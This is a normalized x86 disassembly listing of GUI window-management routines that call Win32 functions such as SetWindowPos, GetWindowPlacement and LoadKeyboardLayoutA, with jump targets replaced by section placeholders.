retn
sub_43c614
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43db40
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43c670
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43c5dc
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413840
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43c6b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4055c0
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4055c0
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43c71c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c7cb
lea eax [ ebp - 0x4 ]
call sub_4055a8
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_435004
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403234
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4055a8
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403430
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ edi + 0x178 ] eax
sub_43c7d4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403430
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c89d
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43c89d
mov eax [ ebp - 0x4 ]
call sub_44e0b4
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4375b8
sub_43c8e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40317c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4391cc
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_4375b8
sub_43c96c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43c994
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0b4
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44dfbc
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403430
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43c994
test al al
jne r-xdata
sub_43c9fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c994
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43ec8c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ca28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c994
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43ec8c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ca54
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43ca7c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0b4
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44dfbc
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403430
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43ca7c
test al al
jne r-xdata
sub_43cae4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ca7c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cb04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ca7c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cb44
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44e0b4
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403430
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43cb44
test al al
jne r-xdata
sub_43cba8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb44
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cbc8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43a834
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43850c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43cbc8
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43cc78
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43cbc8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_44e0b4
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43850c
test eax eax
jne r-xdata
sub_43cd20
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cd40
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cd74
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43b7c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43cd94
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43cde4
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43ce08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_436624
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43a870
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43a834
mov dl [ esp ]
mov si 0xffd1
call sub_403430
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43ce60
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403430
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43ce84
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403430
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43cebc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438fe0
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43a8d0
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43b0e0
sub_43cef4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403430
pop esi
pop ebx
retn
mov eax ebx
call sub_43799c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_40442c
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_40442c
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43cf74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b4c0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4390b4
sub_43cfd4
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43b234
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43a630
pop ebx
retn
sub_43d004
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_43d02c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43a630
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_43d09c
push ebx
mov ebx eax
mov eax ebx
call sub_438f20
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43a8d0
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c24c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43850c
sub_43d0d8
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_435c04
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_43db40
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43850c
sub_43d118
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43de44
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43db40
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d158
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43a8d0
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_43da48
sub_43d198
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_43dc80
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_43dc80
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_43d1f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_437f68
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_436e9c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43b42c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_43d268
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_439058
mov edx esi
mov eax ebx
call sub_43a890
pop esi
pop ebx
retn
sub_43d284
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_434294
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_44e0b4
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403430
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403430
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403430
test al al
jne r-xdata
sub_43d318
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43ec8c
mov edx esi
mov eax ebx
call sub_43d284
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43850c
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43850c
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43850c
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0b4
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43850c
test eax eax
jne r-xdata
jmp r-xdata
sub_43d3fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43850c
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_43d450
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43850c
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0b4
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43850c
test eax eax
jne r-xdata
sub_43d49c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_43d284
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43850c
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0b4
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43850c
test eax eax
jne r-xdata
sub_43d4f8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_44e0b4
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43850c
mov [ esi + 0xc ] eax
sub_43d52c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_43de44
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4369ac
mov eax ebx
mov si 0xffd0
call sub_403430
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_436cf8
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43d604
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43a870
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43a834
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403430
inc edi
dec ebx
jne r-xdata
sub_43d64c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a3d8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43d604
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d6f1
mov eax [ ebp - 0x4 ]
call sub_43a3e0
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_43d6f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43a870
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43a400
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43a834
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
